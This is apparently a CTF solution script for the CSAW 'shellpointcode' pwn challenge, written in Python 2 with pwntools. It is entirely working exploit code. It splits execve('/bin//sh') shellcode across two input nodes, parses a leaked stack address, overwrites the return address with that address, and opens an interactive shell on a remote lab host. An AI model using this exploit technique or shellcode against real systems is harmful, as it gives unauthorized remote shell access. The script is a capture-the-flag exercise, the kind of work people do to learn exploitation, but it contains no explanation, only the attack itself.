#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
context.log_level="CRITICAL"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./shellpointcode")

    def start_binary(self):
#        self.p = process("./shellpointcode")
#        self.p = remote("pwn.chal.csaw.io", 9005)
        self.p = remote("192.168.126.128", 4343)
        self.p.recvuntil("node 1:  \n")

    def pwn_binary(self):
        shellcode_1="\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\xeb\x01"
        shellcode_2="A"*5+"\x48\x31\xd2\x48\xc1\xeb\x08\xeb\x12"
        shellcode_3="\x53\x48\x89\xe7\x48\x31\xf6\xb0\x3b\x0f\x05"
        padding="A"*11
        self.start_binary()

        self.p.sendline(shellcode_3)
        self.p.recvuntil("node 2: \n")
        self.p.sendline(shellcode_2)
        leak_stack=int(self.p.recvuntil("initials?\n")[19:33], 16)
        print "[*] Leak stack address: "+hex(leak_stack)

        self.p.sendline(padding+p64(leak_stack)+shellcode_1)

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
